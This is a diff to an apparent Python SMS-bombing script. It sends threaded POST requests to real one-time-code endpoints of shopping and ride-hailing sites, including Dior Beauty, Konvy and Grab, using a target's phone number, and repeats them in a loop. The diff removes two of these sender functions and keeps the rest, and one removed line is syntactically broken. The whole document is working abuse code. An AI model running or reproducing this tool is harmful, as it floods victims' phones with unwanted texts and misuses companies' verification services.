@@ -65,14 +65,6 @@ def sk8(phone):
     post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", headers={"User-Agent": useragent}, data={"number": f"+66{phone[1:]}"})
 print (f"Send number {phone} | Success ✓")
 
-def sk20(phone):
-    post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone":
-print (f"Send number {phone} | Success ✓")
-
-def sk30(phone):
-    post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})
-print (f"Send number {phone} | Success ✓")
-
 def sk12(phone):
     post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})
 print (f"Send number {phone} | Success ✓")
@@ -126,8 +118,6 @@ for i in range(amount):
 	threading.Thread(target=sk6).start()
 	threading.Thread(target=sk7).start()
 	threading.Thread(target=sk8).start()
-	threading.Thread(target=sk20).start()
-	threading.Thread(target=sk30).start()
 	threading.Thread(target=sk12).start()
 	threading.Thread(target=sk13).start()
 	threading.Thread(target=sk14).start()
